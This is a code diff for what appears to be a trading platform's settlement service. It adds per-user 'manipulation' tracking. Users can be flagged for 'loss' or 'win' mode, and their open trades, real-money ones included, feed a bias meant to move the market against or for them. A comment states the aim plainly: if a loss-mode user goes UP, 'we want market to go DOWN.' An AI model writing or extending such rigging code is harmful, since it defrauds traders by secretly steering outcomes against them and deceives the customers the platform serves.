@@ -1,5 +1,5 @@
 import { get, query, run, transaction } from '../db/mysql-db.ts';
-import { markets_real, markets_demo } from './marketService.ts';
+import { markets_real, markets_demo, userManipulationCache } from './marketService.ts';
 import Big from 'big.js';
 import { getIO } from './socketService.ts';
 import { adminDb, syncUserToFirestore } from '../lib/firebase-admin.ts';
@@ -12,23 +12,27 @@ let isSettling = false;
 
 // Global cache for trade exposure: pair_type -> net exposure (positive means UP trades dominate, negative means DOWN trades dominate)
 export const tradeExposureCache = new Map<string, number>();
+// User specific manipulation exposure: pair_type -> net exposure from users in loss/win mode
+export const manipulatedExposureCache = new Map<string, number>();
 
 export async function updateTradeExposureCache() {
   try {
     const openTrades = await query(`
-      SELECT market_id, is_demo, direction, SUM(amount) as total 
+      SELECT market_id, user_id, is_demo, direction, SUM(amount) as total 
       FROM trades 
       WHERE status = 'open' 
-      GROUP BY market_id, is_demo, direction
+      GROUP BY market_id, user_id, is_demo, direction
     `) as any[];
 
     tradeExposureCache.clear();
+    manipulatedExposureCache.clear();
     
     for (const row of openTrades) {
       const type = row.is_demo ? 'demo' : 'real';
       const key = `${row.market_id}_${type}`;
       const amount = parseFloat(row.total);
       
+      // Update global exposure
       let current = tradeExposureCache.get(key) || 0;
       if (row.direction === 'up') {
         current += amount;
@@ -36,6 +40,22 @@ export async function updateTradeExposureCache() {
         current -= amount;
       }
       tradeExposureCache.set(key, current);
+
+      // Update manipulated exposure if user is in cache
+      const manipulationMode = userManipulationCache.get(row.user_id);
+      if (manipulationMode && manipulationMode !== 'neutral') {
+        let manipCurrent = manipulatedExposureCache.get(key) || 0;
+        let factor = manipulationMode === 'loss' ? -1 : 1; // if loss mode, we treat UP trade as negative bias (down)
+        
+        // Logical check: If user is in LOSS mode and goes UP, we want market to go DOWN.
+        // So we add 'negative' bias for an UP trade.
+        if (row.direction === 'up') {
+          manipCurrent += (amount * factor);
+        } else {
+          manipCurrent -= (amount * factor);
+        }
+        manipulatedExposureCache.set(key, manipCurrent);
+      }
     }
   } catch (err) {
     logger.error('Failed to update trade exposure cache:', err);
